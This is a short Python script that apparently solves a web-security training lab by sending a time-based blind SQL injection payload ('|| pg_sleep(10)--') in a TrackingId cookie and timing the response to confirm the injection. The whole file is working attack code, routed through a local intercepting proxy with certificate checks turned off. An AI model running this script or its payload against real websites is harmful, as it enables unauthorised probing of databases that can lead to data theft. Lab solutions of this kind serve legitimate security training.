import urllib3
import urllib
import sys
import re
import requests
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit(url:str):
    payload = "' || pg_sleep(10)--"
    cookies = {'TrackingId': 'QvTDhNR0LFz7RqlG' + payload,
               'session': 'PhV63e8FL4k3GuTHtbv4VMr5w5TwCxu6'}
    r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    if r.elapsed.total_seconds() >= 10 and r.status_code == 200:
        print("Delay was successful")
        return True
    else:
        print("Delay was not successful")
        return False

def main():
    if len(sys.argv) != 2:
        print(f"Script Usage: {sys.argv[0]} <url>")
        print(f"Example: {sys.argv[0]} example.com")
        sys.exit(-1)
    
    url = sys.argv[1]
    if url.endswith('/'):
        url = url.removesuffix('/')
    
    if exploit(url):
        print("Lab Solved")
        sys.exit(0)
    else:
        sys.exit(-1)

if __name__ == '__main__':
    main()